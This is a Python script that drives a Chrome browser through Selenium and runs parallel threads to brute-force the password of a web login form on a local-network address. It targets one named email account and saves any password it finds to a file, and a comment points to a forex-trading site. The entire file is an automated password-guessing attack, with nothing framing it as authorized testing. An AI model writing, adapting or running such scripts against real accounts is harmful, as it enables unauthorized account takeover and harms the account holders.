from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from itertools import product
from concurrent.futures import ThreadPoolExecutor
import os

# Function to initialize the WebDriver
def create_driver():
    return webdriver.Chrome()

# Function to send the password if it is correct
def send_password(password: str):
    try:
        with open('file.txt', 'w') as file:
            file.write(str(password))
    except Exception as e:
        print(password)
        print(f"Error writing password: {e}")

# Function to attempt login with the given password
def attempt_login(password: str) -> bool:
    driver = create_driver()
    driver.get("http://192.168.31.196:5000/")

    login_input = driver.find_element(By.NAME, "loginEmail")
    password_input = driver.find_element(By.NAME, "loginPassword")
    submit_button = driver.find_element(By.ID, "login-btn")

    login_input.send_keys("alexandrsokolov6897@gmail.com")
    password_input.send_keys(password)

    submit_button.click()

    #https://www.myfxbook.com/
    if driver.current_url == "https://www.example.com":
        send_password(password)
        driver.quit()
        return True
    else:
        driver.quit()
        return False

# Main function to generate combinations and attempt logins
def main():
    now_time = datetime.now()
    symbols = "123456789"
    combinations = (''.join(combination) for combination in product(symbols, repeat=1))

    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = {executor.submit(attempt_login, combination): combination for combination in combinations}

        for future in futures:
            try:
                if future.result():
                    print(f"Password found: {futures[future]}")
                    print(datetime.now() - now_time)
                    break
            except Exception as e:
                print(f"Error during login attempt: {e}")

if __name__ == "__main__":
    main()
